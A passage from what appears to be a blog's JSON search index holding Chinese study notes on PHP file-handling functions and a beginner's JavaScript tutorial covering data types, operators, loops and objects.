6、rewind(); &#x2F;&#x2F; 倒回文件目录指针位置7、flock(); &#x2F;&#x2F; 轻便的咨询文件锁定 实例： $file&#x3D;fopen(&#39;test.txt&#39;,&#39;a+&#39;); &#x2F;&#x2F; 共享锁：LOCK_SH，独占锁：LOCK_EX，释放锁定：LOCK_UN， &#x2F;&#x2F; 不希望flock()在锁定时堵塞：LOCK_NB, if(flock($file,LOCK_EX))&#123; &#x2F;&#x2F; sleep 延时 sleep(15); fwrite($file,&#39;2.php&#39;); flock($file,LOCK_UN); &#125;else&#123; echo &#39;加锁失败&#39;; 8、ftruncate(); &#x2F;&#x2F; 将文件截断到给定的长度9、fclose(); &#x2F;&#x2F; 关闭一个已经打开的文件指针 实例 fclose($file);10、file(); &#x2F;&#x2F; 把整个文件读入一个数组中11、copy(); &#x2F;&#x2F; 拷贝文件12、unlink(); &#x2F;&#x2F; 删除文件13、file_get_contents(); &#x2F;&#x2F; 将整个文件读入一个字符串14、file_put_contents(); &#x2F;&#x2F; 将字符串写入文件中 实例： header(&#39;Content-type;text&#x2F;html;charset&#x3D;utf-8&#39;); &#x2F;&#x2F; 可以填入URL var_dump(file_get_contents(&#39;test.txt&#39;)); &#x2F;&#x2F; 写入文件中并覆盖原来的内容 var_dump(file_put_contents(&#39;test.txt&#39;,&#39;www.baidu.com&#39;));15、rename(); &#x2F;&#x2F; 重命名一个文件或目录16、readfile(); &#x2F;&#x2F; 读入一个文件并写入到输出缓冲","categories":[],"tags":[]},{"title":"JavaScript","slug":"JavaScript","date":"2020-04-03T06:33:47.810Z","updated":"2020-04-03T06:33:44.000Z","comments":true,"path":"2020/04/03/JavaScript/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/JavaScript/","excerpt":"","text":"JavaScript语言特点1、基于对象的编程语言2、解释执行脚本语言第一个JS代码hello wordalert()属性alert()控制浏览器弹出一个警告框 1alert(&quot;这是我的第一行JS代码&quot;) document.write()属性document.write()让计算机在页面输出一个内容 1document.write(&quot;点我一下看我出不出来&quot;) console.log()属性console.log()向控制台输出一个内容console.log 只能在网页源代码中的控制台显示 12# console.log 只能在网页源代码中的控制台显示console.log(&quot;你猜我在哪里&quot;) 以上这些条件都需要写在script标签中JS编写位置虽然可以写在标签的属性中，但是他们属于结构与行为耦合，不方便维护，不推荐使用12345678可以将JS代码编写到标签的onclick属性中当我们点击按钮时，JS代码才会执行&lt;button onclick&#x3D;&quot;alert(&#39;你为什么要点我&#39;);&quot;&gt;点我一下&lt;&#x2F;button&gt;可以将JS代码写在超链接的href属性中，这样当我们点击超链接时，或执行JS代码&lt;a href&#x3D;&quot;javascript:alert(&#39;你怎么又点了我一下&#39;);&quot;&gt;你也点我一下&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:&quot;&gt;你也点我一下&lt;&#x2F;a&gt; 1234可以将js代码编写到script标签中&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(&quot;这是script标签中的代码&quot;); &lt;&#x2F;script&gt; 123456789101112可以将js代码编写到外部js文件中，然后通过script标签引入写到外部文件中，可以再不同的页面同时引用，也可以利用到浏览器的缓存机制推荐使用的方式引入的命令式 src&#x3D;&quot;外部文件名称&quot;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;script.js&quot;&gt;&lt;&#x2F;script&gt;script标签一旦用于引入外部文件，就不能编写代码了，即使编写了浏览器也会忽略 如果需要则可以再创建一个script标签用于编写内部代码&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(&quot;我是内部代码，刚才不行，我新建一个script标签&quot;);&lt;&#x2F;script&gt; JS基本语法123456789101112131415&#x2F;* *&#x2F;多行注释 JS注释 多行注释，注释中的内容不会被执行，但是可以再源代码中查看 要养成良好的编写注释的习惯，也可以通过注释来对代码进行一些简单的测试 &#x2F;&#x2F;单行注释 alert(&quot;hello&quot;); &#x2F;&#x2F;该语句会在网页中弹出一个窗口 document.write(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在网页中输出 console.log(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在控制台输出 1、在JS中严格区分大小写2、JS中每一条语句以分号(;)结尾 - 如果不写分号，浏览器会自动添加，但是会消耗一些系统资源 而且有些时候，浏览器会加错分号，所以在开发中分号必须写3、JS中会忽略多个空格和换行，所以我们可以利用这个空格和换行进行格式化 字面量和变量1234567891011121314151617181920字面量，都是一些不可改变的值比如：1、2、3、4、5、字面量都是可以直接使用的，但是我们一般都不会直接使用字面量 变量 变量可以用来保存字面量，而且变量的值是可以任意改变的 变量更加方便使用，所以在开发中都是通过变量去保存一个字面量 而很少使用字面量 可以通过变量对字面量进行描述如果要是用需要声明变量在JS中声明变量用关键字var，假如要定义一个变量a var a;为变量赋值 a &#x3D; 123; a &#x3D; 456; a &#x3D; 1321561615315;可以声明和赋值同时进行 var a &#x3D; 123; var c &#x3D; 0; console.log(a); 标识符12345678910111213141516标识符 - 在JS中所有的可以由我们自主命名的都可以成为是标识符 - 例如：变量名、函数名、属性名都属于标识符 - 我们在命名一个标识符时需要遵守以下规则： 1、标识符中可以含有字母、数字、下划线、$符 2、标识符不能以数字开头 3、标识符不能是ES中的关键字或保留字 4、标识符一般都采用驼峰命名法 &#x2F;&#x2F;只是语法规范 - 首字母小写，每个单词首字母大写，其他字母小写 驼峰命名法:helloWord - JS底层保存的标识符实际上时采用Unicode编码(UTF-8)， 所以理论上讲，所有的UTF-8中含有的内容都可以作为标识符 var a_1_$ &#x3D; 12345; &#x2F;&#x2F;包含了字母、数字、下划线、$符 console.log(a_1_$); 数据类型字符串1234567891011121314151617181920212223242526272829数据类型指的就是字面量的类型、 在JS中一共有六中数据类型 String 字符串 Number 数值 Boolean 布尔值 Null 空值 Underfind 未定义 Object 定义对象 其中String Number Boolean Null Undefined属于基本数据类型 而Object属于引用数据类型 String字符串 - 字符串需要用引号引起来,双引号和单引号都可以。 如果想让引号或者其他特殊符号变成普通符号用 \\ 进行转义 \\ 表示转义字符 \\n 表示换行 \\t 制表符 \\\\ 自己转义自己 var str &#x3D; &quot;代码没写完不许睡觉&quot; &#x2F;&#x2F; 表示输出字面量，也就是输出当前字符串 alert(&quot;STR&quot;) &#x2F;&#x2F; 表示输出变量 alert(str); var str &#x3D; &quot;hello&quot;; console.log(str); Number123456789101112131415161718192021222324252627282930所有的数值都是Number类型， 包括整数和浮点数 JS中表示的数字最大值 Number.MAX_VALUE 1.7976931348623157e+308 Number.MIN_VALUE最小值 e-324 如果使用Number.MAX_VALUE超过了数字最大值，则会返回一个Infinity表示正无穷的 typeof检查Infinity返回 Number类型 字符串乘字符串会返回一个 NaN 而NaN表示这不是一个数字 typeof 检查 NaN 也是返回Number类型 &#x2F;&#x2F; 数字123 var a &#x3D; 123; &#x2F;&#x2F;字符串123 var b &#x3D; &quot;123&quot;; typeof 查看数据类型 &#x2F;&#x2F; console.log(typeof b); console.log(Number.MAX_VALUE); &#x2F;&#x2F; 在进行整数运算基本可以保证精确 var c &#x3D; 123156 + 151563; document.write(c); &#x2F;&#x2F; JS进行小数运算，可能得到一个不精确的结果 &#x2F;&#x2F; 千万不能使用JS进行对精确度比较高的运算 var c &#x3D; 0.1 + 0.2; document.write(c); Boolean12345布尔值只有两个，用来逻辑判断True和Fales使用typeof检查布尔值时，返回boolean var bool &#x3D; true; document.write(typeof bool); Null和Underfind1234567891011null类型的值只有一个就是null，表示空 使用typeof检查null值时，会返回object underfind类型的值只有一个，就是underfind 当声明一个变量并没有赋值时，他的值就是underfind 使用typeof检查underfind值时，会返回underfind var a &#x3D; null; var b; document.write(typeof b); 强制类型转换String12345678910111213141516171819202122232425262728293031强制类型转换 - 指将一个数据类型强制转换为其他数据类型 - 类型转换主要指，将其他数据类型转换为 String、Number、Boolean 将其他数据类型转换成String 方式一: - 调用被转换数据类型的toString()方法 - 该方法不会影响到原变量 - 注意null 和underfind这两个值没有tostring()方法, 如果通过他们的方法，会报错 方式二: - 调用String()函数,并将被转的数据类型作为参数传递给函数 - 使用String()函数做的强制类型转换时 对于Number和Boolean实际上就是调用的toString()方法 但是对于null和undefined，就不会调用toString()方法 他会将null直接转换成&quot;null&quot; 将undefined 直接转换为 &quot;underfined&quot;var a &#x3D; 123;&#x2F;&#x2F; 调用a的toString()方法&#x2F;&#x2F;调用 xxx的yyy()方法，就是xxx.yyyvar a &#x3D; a.toString();document.write(typeof a);document.write(a); var b &#x3D; 123;var c &#x3D; String(b);document.write(typeof c);document.write(c); Number123456789101112131415161718192021222324252627282930313233343536373839将其他的数据类型转换为Number转换方式一: 使用number()函数 - 字符换---&gt; 数字 1、如果是纯数字的字符串，则直接将其转换为数字 2、如果，字符串中又非数字的内容，则转换成NaN 3、如果字符串是一个空或者是全空格的字符串，则转换为0 - 布尔值 --&gt; 数字 true 变成 1 false 变成 0 - Null --&gt; 数字 0 - undefined --&gt; 数字 NaN转换方式二: - 这种方式专门用来对付字符串 - parseInt() 把一个字符串转换成一个整数 - parseFloat() 把一个字符串转换成一个浮点数 var a &#x3D; &quot;132&quot;;document.write(typeof a);document.write(a); var b &#x3D; &quot;123a456px&quot;;&#x2F;&#x2F; 调用parseInt()函数将b转换为number parseInt()可以将一个字符串中的有效的整数内容取出来 然后转换成NumberpasrFloat()作用和parseFloat()类似，不同的是它可以获得有效的小数c &#x3D; parseInt(b);a &#x3D; &quot;123.12。789px&quot;;a &#x3D;parseFloat(a);如果对非String使用parseInt()或parseFloat() 它会先将其转换为String，然后再操作a &#x3D; truea &#x3D; parseInt(a);document.write(typeof a);document.write(a); Boolean1234567891011121314151617将其他的数据类型转换为Boolean - 使用Boolean()函数 - 数字 ---&gt; 布尔 - 除了0和NaN，其余都为true - 字符串 ---&gt; 布尔 - 除了空串，都是true - null和undefined都会转换为False - 对象也会转换为true var a &#x3D; 123; &#x2F;&#x2F;truea &#x3D; -123; &#x2F;&#x2F;truea &#x3D; 0; &#x2F;&#x2F;falsea &#x3D; Infinity; &#x2F;&#x2F;true&#x2F;&#x2F; 调用Boolean()函数来将a转换为布尔值a &#x3D; Boolean(a);document.write(typeof a);document.write(a); 运算符12345678910111213141516171819202122232425262728293031323334353637383940414243运算符也叫操作符 通过运算符可以对一个或多个值进行运算 比如：typeof就是运算符，可以来获得一个值的类型 它会将该值的类型以字符串的形式返回 算术运算符 当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算 任何值和NaN运算都是NaN 任何值和字符串做加法运算，都会先转换为字符串，然后再进行字符串拼接 + 可以对两个值进行加法运算并将结果返回 如果两个字符串相加，会拼接- 可以对两个值进行减法预算，并将结果返回* 可以对两个值进行乘法运算&#x2F; 可以对两个值进行除法运算% 可以对两个值进行求余运算我们可以利用这一点，来将任意一个数值类型转换为String 我们只需要为任意的数据类型 + 一个&quot;&quot; 即可将其转换为字符串 这是一种隐式的类型转换，由浏览器自动完成，实际上它也是调用String()函数 任何值做— * &#x2F; 运算时都会自动转换为Number 可以利用这一点进行隐式类型转换 乘除是1 减法是0 原理和Number()函数一样，使用起来更加简单var a &#x3D;123;&#x2F;&#x2F;a &#x3D; a + &quot;&quot;;&#x2F;&#x2F;document.write(typeof a);document.write(&quot;c &#x3D; &quot; + a);var a &#x3D;&quot;123&quot;;a &#x3D; a * 1;document.write(a);var a &#x3D;&quot;123&quot;;a &#x3D; a - 0;document.write(a); 一元运算符1234567891011121314151617181920212223一元运算符，只需要一个操作数 + 正号 - 正好不会对数字产生任何影响 — 负号 - 负号可以对数字进行负号的取反 - 正负得负，负负得正 - 对于非Number类型的值， 他会先转换为Number，然后再运算 可以对一个其他的数据类型使用+，来将其转换为Number 原理和Number()函数一样 var a &#x3D; 123; a &#x3D; -a; var a &#x3D; &quot;123&quot;; a &#x3D; -a &#x2F;*document.write(&quot;a &#x3D; &quot; + a); document.write(typeof a);*&#x2F; var result &#x3D; 1 + +&quot;2&quot; + 3; document.write(&quot;result + &quot; &#x3D; result); document.write(typeof result); 自增自减123456自增 ++ - 通过自增可以使变量再自身的基础上增加1 - 对于一个变量自增以后，原变量的值会立即自增1 自减 -- - 通过自减可以使变量在自身的基础上自减一 逻辑运算符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960JS提供了三种逻辑运算符 ! 非 - ! 可以用来对一个值进行非运算 - 所谓非运算就是对一个布尔值进行取反操作，比较像!&#x3D; - 进行两次取反，不会变化 - 如果对非布尔值进行非运算，则会先将其转换为布尔值，然后再取反 所以我们可以利用该特点，来讲一个其他的数据类型转换为布尔值 可以为任意一个数据去取反两次，来将其转换为布尔值 原理和Boolean()函数相同 var a &#x3D; 123; a &#x3D; !!a; document.write(&quot;a &#x3D;&quot;a); &amp;&amp; 与 - &amp;&amp;可以对符号两侧的值进行与运算，并返回结果 - 两个值中只要有一个值为flase结果就为flase，比较像 and &#x2F;&#x2F; 第一个值为true，检查第二个值 true &amp;&amp; alert(&quot;你好啊&quot;); &#x2F;&#x2F; 第一个值为false，直接返回false，不去检查第二个值 fales &amp;&amp; alert(&quot;你好啊&quot;); || 或 - ||可以对一个值进或运算,并返回结果 - 两个值中只要有一个值为true结果就为true，比较像 or - JS中的&quot;或&quot;属于，短路或 result &#x3D; false || false result &#x3D; true || false result &#x3D; true || true; document.write(&quot;result &#x3D; &quot;+ result); &amp;&amp; || 非布尔值的情况 - 对于非布尔值进行与或运算时， 会先将其转换为布尔值，然后再运算，并且返回原值- &amp;&amp;与运算 - 如果第一个值时true，则必然返回第二个值 - 如果第一个值为false，直接返回第一个值 &#x2F;&#x2F; true &amp;&amp; true &#x2F;&#x2F; 与运算，如果两个值都为true，则返回后边的 var result &#x3D; 5 &amp;&amp; 6; &#x2F;&#x2F; false &amp;&amp; true result &#x3D; 0 &amp;&amp; 2; &#x2F;&#x2F; 非布尔值里面又false返回false result &#x3D; 2 &amp;&amp; 0; &#x2F;&#x2F; 与运算，如果第一个值为false直接返回第一个值 result &#x3D; NaN &amp;&amp; 0; result &#x3D; 0 &amp;&amp; NaN document.write(&quot;result +&quot;+result);- ||或运算 - 如果第一个值为true直接返回第一个值 - 如果第一个值为false，则直接返回第二个值 &#x2F;&#x2F; 返回结果5var result &#x3D; 5 || 6;返回结果0result &#x3D; NaN || 0; 赋值运算符12345678赋值运算符 &#x3D; 可以将右侧的值赋给左侧的变量 var a &#x3D; 123; +&#x3D; a +&#x3D; 5;等价于a &#x3D; a+5; -&#x3D; a -&#x3D; 5;等价于a &#x3D; a-5; 关系运算符1234567891011121314151617181920212223242526272829通过关系运算符可以比较两个值之间的大小关系， 如果关系成立它会返回true如果关系不成立，返回false &gt; 大于号 关系成立返回true不成立返回发false &gt;&#x3D; 大于等于 关系成立返回true不成立返回发false &lt; 小于 关系成立返回true不成立返回发false &lt;&#x3D; 大于等于 关系成立返回true不成立返回发false 非数值比较 - 对于非数值比较时，会先将其转换为数字，再进行比较 - 如果比较符号两边都是字符串，不会将其转换为数字进行比较 而会分别比较字符串的Unicode编码 NaN和任何值作比较都为false 两个字符串比较时，比较字符串编码在字符串中使用转义字符输入Unicode编码 \\u四位编码,16进制&lt;body&gt; &lt;!--在网页中使用Unicode编码 &amp;#编码; 这里的编码需要的时10进制 --&gt; &lt;h1&gt;&amp;#9760&lt;&#x2F;h1&gt; &lt;&#x2F;body&gt; 相等运算符12345678910111213141516171819202122232425相等运算符用来比较两个值是否相等， 如果相等会返回true，否则返回false 使用&#x3D;&#x3D; 来做想等运算 - 当使用&#x3D;&#x3D;来比较两个值时，如果值的类型不同， 则会自动进行类型转换，将其转换为相同类型 然后在比较是否相等 NaN不和任何值相等，包括他本身 因为NaN不和任何值相等，所以如果要判断这个值是否为NaN 用isNaN()函数来判断一个值是否为NaN 如果成立返回true不成立返回false var a &#x3D; NaN; document.write(isNaN(a)); 不相等 不相等判断两个值是否相等，如果不相等返回true，否则返回false - 用!&#x3D;来判断 &#x3D;&#x3D;&#x3D; 全等 - 用来判断两个值是否全等，他和相等类似，不同的是他不会进行类型转换 如果两个值的类习惯不同，直接返回false !&#x3D;&#x3D; 不全等 - 用来判断两个值是否不全等，和不等类似，不同的是他不会进行类型转换 条件运算符1234567891011121314151617181920条件运算符也叫三元运算符 语法: 条件表达式?语句1:语句2; - 执行流程: 条件运算符在执行时，首席按对条件表达式进行求值 如果该值为true，则执行语句1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件的表达式的求职结果是一个布尔值， 会将其转换为布尔值然后再运算 var a &#x3D; 30; var b &#x3D; 20; var c &#x3D; 50; &#x2F;&#x2F;a&gt;b?alert(&quot;a大&quot;):alert(&quot;a小&quot;); &#x2F;&#x2F; 获取a和b的最大值 var max &#x3D; a&gt;b?a:b; max &#x3D; max&gt;c?max:c; alert(max); 运算符优先级 1234567891011121314151617, 运算符 使用 , 可以分割多个语句，一般可以在声明多个变量时使用， 再JS中有一个运算符优先级的表， 在表中越靠上的优先级越高，优先级越高优先计算， 如果优先级一样，从左往右计算 优先级的表不需要记忆，如果遇到优先级不清楚的 用()括起来 &#x2F;&#x2F; 可以同时声明多个变量并赋值 &#x2F;&#x2F;var a &#x3D; 1 , b &#x3D; 2 , c &#x3D; 3 &#x2F;* 如果||的优先级高，或者和两个一样高，应该返回3 如果&amp;&amp;的优先级高，则应该返回1 *&#x2F; var result &#x3D; 1 || 2 &amp;&amp; 3; alert(result); 代码块12345678我们的程序是由一条一条的语句构成的 语句是按照自上向下的顺序一条一条执行的 再JS中可以使用&#123;&#125;来为语句进行分组， 再同一个&#123;&#125;中的语句我们称为一组语句， 它要么都执行，要么都不执行。 一个&#123;&#125;中的语句我们也称为一个代码块 在代码块的后边也就不用再编写;分号了 JS中的代码块，只具有分组的作用，没有其他的用处 流程控制语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&#x2F;* 流程控制语句 - JS中的程序是从上到下一行一行执行的 - 通过流程控制语句可以控制程序执行流程， 程序可以根据一定的条件来选择执行 - 语句分类: 1、条件判断语句 2、条件分支语句 3、循环语句 条件判断语句： - 使用条件判断语句可以再执行某个语句之前进行判断， 如果条件成立才会执行，条件不成立语句不执行 - if语句 - 语法一: if(条件表达式)&#123; 语句... &#125; if语句只能控制紧随其后的那个语句 如果希望if语句可以控制多条语句， 可以将这些语句统一放到代码块中。 if语句后的代码块不是必须的，但是再开发中最好写上代码块， 即使代码块只有一条 *&#x2F;var a &#x3D; 15; if (a &gt; 10 &amp;&amp; a &lt;&#x3D; 20 )&#123; alert(&quot;劳资大于10，但是劳资小于等于20&quot;); &#125;if else 语句 if(条件表达式)&#123; 语句... &#125; else&#123; 语句... &#125; if...else...语句 当该语句执行时，会先对if后的条件表达式进行判断 如果成立执行if后的语句 如果不成立执行else后面的语句 if(条件表达式)&#123; 语句... &#125; else if(条件表达式)&#123; 语句... &#125; else if(条件表达式)&#123; 语句... &#125; else&#123; 语句... &#125; if...else if...else 当该语句执行时，会从上到下依次对条件表达式进行求值判断 如果值为true，则执行当前语句。 如果值为false，则继续向下判断。 如果条件都不满足，执行else语句 语句块中，只会有一个代码块被执行，一旦代码块执行了，则直接结束判断 *&#x2F; age &#x3D; 19; if(age &gt; 80)&#123; alert(&quot;你快完了&quot;); &#125;else if(age&gt;60)&#123; alert(&quot;你不应该工作了&quot;); &#125;else if(age&gt;30)&#123; alert(&quot;你已经中年了&quot;); &#125;else if(age &gt;17)&#123; alert(&quot;你已经成年了&quot;); &#125;else&#123; alert(&quot;你未成年&quot;); &#125; switch…case…default123456789101112131415161718192021222324252627282930313233343536373839404142语法: switch(变量)&#123; case 表达式： 语句.... break case 表达式: 语句.... break ...... default: 语句.... break&#125; 执行流程: switch ... case ... 语句 在执行时会依次将case后的表达式的值和switch后的条件表达式的值进行全等比较 如果比较结果为true，则从当前case处开始执行代码 当前case后的所有的代码都会执行，我们可以在case的后边跟一个break关键字， 这样可以确保只会执行当前case后的语句，而不会执行其他的case 如果比较结果为false，则继续向下比较 如果所有比较都为false，则只执行default后的语句 switch语句和if语句的功能实际上有重复的，使用switch可以实现if的功能 同样使用if也可以实现switch的功能，所以我们在使用时根据自己的习惯选择num &#x3D; 3;switch(num)&#123; case 1: alert(&quot;111&quot;); break;case 2: alert(&quot;222&quot;); break;case 3: alert(&quot;333&quot;); break;default: alert(&quot;非法数字&quot;); break;&#125; while循环12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061向页面中输出连续的数字 &lt;br &#x2F;&gt;是在网页中换行 循环语句： 通过循环语句可以反复的执行一段代码多次 while循环 - 语法: whitle(条件表达式)&#123; 语句... &#125; - while语句再执行时， 先对条件表达式进行判断，如果为true，执行循环体， 第一次循环完毕后，在进行判断，如果还为true，则继续循环u 如果为false，终止循环 do...while循环 - 语法: do&#123; 语句... &#125;while(条件表达式) - 执行流程 do...whlie语句在执行时，会先执行循环体， 循环体执行完毕后，在对while后的条件表达式进行判断 如果结果为true，则继续执行循环体，执行完毕继续判断一次类推 如果结果为false，则终止循环 两个语句的功能类似，不同的是while是先判断后执行， do...while是先执行后判断 do...while可以保证循环体至少执行一次， 而while不能 var n &#x3D; 6; while(n&gt;1)&#123; alert(n); n--; &#125; var count &#x3D; 0; var money &#x3D; 1000; while(money&lt;&#x3D;5000)&#123; money *&#x3D; 1.05; count++; &#125; 输入期末成绩，等于一百奖励一辆BWM,80-99奖励iPhone，60-80奖励一本书,其他什么奖励也没有while(true)&#123; var result &#x3D; prompt(&quot;请输入成绩:&quot;); if(result&gt;&#x3D;0 &amp;&amp; result&lt;&#x3D;100)&#123; break &#125; &#125; if(result&gt;&#x3D;60 &amp;&amp; result&lt;&#x3D;80)&#123; alert(&quot;奖励一本书&quot;); &#125;else if(result&gt;80 &amp;&amp; result&lt;99)&#123; alert(&quot;奖励一台iphone&quot;); &#125;else if(result &#x3D;&#x3D; 100)&#123; alert(&quot;奖励一辆BWM&quot;); &#125;else&#123; alert(&quot;什么奖励也没有&quot;); &#125; for循环12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 for循环的语法: for(初始化表达式;条件表达式;更新表达式)&#123; 语句... &#125; *&#x2F; &#x2F;* result &#x3D; 0 sum &#x3D; 0; for(n &#x3D; 1;n&lt;&#x3D;100;n++)&#123; if(n%7 &#x3D;&#x3D;0)&#123; sum &#x3D; sum+n; result++ &#125; &#125;document.write(sum+&quot;&lt;br &#x2F;&gt;&quot;); document.write(result+&quot;&lt;br &#x2F;&gt;&quot;); *&#x2F; &#x2F;&#x2F;求水仙花数 &#x2F;&#x2F;打印所有的三位数 for(var i &#x3D; 100; i&lt;1000;i++)&#123; &#x2F;&#x2F;获取百位数 var bai &#x3D; parseInt(i&#x2F;100); &#x2F;&#x2F;获取十位数 var shi &#x3D; parseInt((i-bai*100)&#x2F;10); &#x2F;&#x2F;获取个位数 var ge &#x3D; (i%10); &#x2F;&#x2F;判断i是否是水仙花数 if(bai*bai*bai+shi*shi*shi+ge*ge*ge &#x3D;&#x3D; i)&#123; document.write(i+&quot;&lt;br &#x2F;&gt;&quot;); &#125; &#125; 在页面输入数字，判断是否是质数var num &#x3D; prompt(&quot;请输入一个质数数字:&quot;) if(num&lt;&#x3D;1)&#123; alert(&quot;该值不合法&quot;); &#125;else&#123; falg &#x3D; true for(var i &#x3D; 2;i&lt;num;i++)&#123; if(num % i &#x3D;&#x3D;0)&#123; falg&#x3D;false; &#125; &#125; &#125; if(falg)&#123; alert(num+&quot;是质数&quot;); &#125;else&#123; alert(&quot;不是质数&quot;) &#125; 练习1234567891011121314151617181920212223242526272829乘法表for(a&#x3D;1;a&lt;&#x3D;9;a++)&#123; for(i&#x3D;1;i&lt;&#x3D;a;i++)&#123; document.write(i+&quot;*&quot;+a+&quot;&#x3D;&quot;+i*a+&quot;&amp;nbsp;&amp;nbsp;&quot;); &#125;document.write(&quot;&lt;br &#x2F;&gt;&quot;); &#125; 打印2-100之间的所有数 for(var i &#x3D; 2 ; i &lt;&#x3D;100;i++)&#123; &#x2F;&#x2F; 创建一个布尔值，用来保存结果，默认i是质数 var falg &#x3D; true &#x2F;&#x2F; 判断i是否是质数 &#x2F;&#x2F; 获取到2-i之间的所有数 for(var j&#x3D;2; j&lt;i;j++)&#123; &#x2F;&#x2F; 判断i是否能被j整除 if(i%j&#x3D;&#x3D;0)&#123; &#x2F;&#x2F; 如果进入判断则整明i不是质数，修改falg值为false falg&#x3D;false; &#125; &#125; &#x2F;&#x2F; 如果是质数，则打印i的值 if(falg)&#123; document.write(i+&quot;&amp;nbsp&quot;); &#125; &#125; break和continue1234567891011121314151617181920212223&#x2F;* break关键字可以用来退出switch或循环语句 不能在if语句中使用break和continue break关键字，会终止离他最近的循环 *&#x2F; for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123; document.write(i+&quot;&amp;nbsp&quot;); if(i &#x3D;&#x3D; 4)&#123; break &#125; &#125; &#x2F;* continue关键字可以用来跳过当次循环 同样continue也是默认只会对最近的循环其作用 *&#x2F; for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123; document.write(i+&quot;&amp;nbsp&quot;); if(i &#x3D;&#x3D; 4)&#123; continue &#125; &#125; 对象的基本操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768JS数据类型 - String 字符串 - Number 数值 - Boolean 布尔型 - Null 空 - undefined 未定义 - 以上这五种类型属于基本数据类型，如果我们看到的值 只要不是上面的5中，全都都是对象 - Object 对象 基本数据类型都是单一的值&quot;hellp&quot; 123 true， 值和值之间没有任何的联系。 在JS中标识一个人的信息(name gender age) var name &#x3D; &quot;孙悟空&quot;; var gender &#x3D; &quot;男&quot;; var age &#x3D; 18; 如果使用基本数据类型的数据，我们所创建的变量都是独立的，不能成为一个整体 对象的分类: 1、内建对象 - 由ES标准中定义的对象，在任何的ES的实现中都可以使用 - 比如，Math String Number Boolean Function Object.... 2、宿主对象 - 由JS的运行环境提供的对象，目前来讲主要由浏览器提供的对象 - 比如 BOM DOM 3、自定义对象 - 由开发人员自己创建的对象 &#x2F;&#x2F;创建对象 使用new关键字调用的函数，是构造函数constructor 构造函数时专门用来创建对象的函数 使用typeof检查一个对象时，返回object var obj &#x3D; new Object(); 在对象中保存的值成为属性 向对象添加属性 语法:对象.属性名 &#x3D; 属性值; 如果读取对象中没有属性，不会报错而是返回undefined &#x2F;&#x2F; 向obj中添加一个name属性 obj.name &#x3D; &quot;孙悟空&quot;; &#x2F;&#x2F; 向obj中添加一个gender属性 obj.gender &#x3D; &quot;男&quot;; obj.age &#x3D; 18; 读取对象中的属性 语法: 对象.属性名 &#x2F;&#x2F;document.write(obj.gender); 修改对象的属性值 语法: 对象.属性名 &#x3D; 新值 obj.name &#x3D; &quot;齐天大圣&quot; document.write(obj.name); 删除对象属性 语法：delete 对象.属性名 delete obj.name; document.write(obj.name); 属性名和属性值12345678910111213141516171819202122232425262728293031323334353637383940414243444546向对象中添加属性 - 对象的属性名不强制要求遵守标识符的规范 什么乱七八糟的名字都可以使用 - 但是在使用的时候最好还是按照标识符的规范去做 obj.name &#x3D; &quot;孙悟空&quot; 如果要使用特殊的属性名，不能采用.的方式来操作 需要时用另一种方式： 语法：对象[&quot;属性名&quot;] &#x3D; 属性值 读取时也要采用这种方式 使用[]这种形式去操作属性，更加的灵活， 在[]中可以直接传递一个变量，这样变量值时多少就会读取那个属性 obj[&quot;123&quot;] &#x3D; 456; obj[&quot;nihao&quot;] &#x3D; &quot;你好&quot; var a &#x3D; &quot;nihao&quot; document.write(obj[a]); 属性值 JS对象的属性值，可以是任意的数据类型 是指也可以是一个对象 obj.text &#x3D; true; document.write(obj.text); &#x2F;&#x2F; 创建一个对象 var obj2 &#x3D; new Object(); obj2.name &#x3D; &quot;猪八戒&quot; &#x2F;&#x2F; 将obj2设置为obj属性 obj.test &#x3D; obj2; document.write(obj.test.name); in运算符 - 通过该运算符可以检查一个对象中是否含有指定的属性 如果有则返回true，没有返回false 语法： &quot;属性名&quot; in 对象 &#x2F;&#x2F; 价差obj中是否含有obj2这个属性 &#x2F;&#x2F; document.write(&quot;test2&quot; in obj); &#x2F;&#x2F; document.write(&quot;test&quot; in obj); document.write(&quot;name&quot; in obj); 基本和引用数据类型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849基本数据类型 String Number Boolean Null undefined 引用数据类型 Object JS中的变量都是保存到栈内存中的， 基本数据类型的值直接在栈内存中存储， 值与值之间是独立存在，修改一个变量不会影响其他的变量 对象是保存到堆内存的，每创建一个新的对象，就会在堆内存中开辟出一个新的空间 而变量保存的是对象的内存地址(对象的引用),如果两个变量保存的是同一个对象引用， 当一个通过一个变量修改属性时，另一个也会受到影响 var a &#x3D; 123;var b &#x3D; a;a++; &#x2F;&#x2F; a和b的两个值是完全独立的，一个值的变化并不会影响另一个值 document.write(&quot;a &#x3D; &quot;+ a); &#x2F;&#x2F; 124 document.write(&quot;b &#x3D; &quot;+ b); &#x2F;&#x2F; 123 &#x2F;&#x2F; 修改一个值后，另一个值也跟着变化 var obj &#x3D; new Object(); obj.name &#x3D; &quot;孙悟空&quot;; var obj2 &#x3D; obj; &#x2F;&#x2F; 修改obj的name属性 obj.name &#x3D; &quot;唐僧&quot; document.write(obj.name); document.write(obj2.name); &#x2F;&#x2F; 设置obj2为null&#x2F;&#x2F; 当修改变量的值的时候，对其它对象没有影响 obj2 &#x3D; null; document.write(obj); document.write(obj2); var obj3 &#x3D; new Object(); var obj4 &#x3D; new Object(); obj3.name &#x3D; &quot;沙和尚&quot;; obj4.name &#x3D; &quot;沙和尚&quot;; document.write(obj3.name); document.write(obj4.name); document.write(obj3 &#x3D;&#x3D; obj4); 当比较两个基本数据类型的值时，就是比较值。 而比较两个引用数据类型时，他是比较的对象的内存地址， 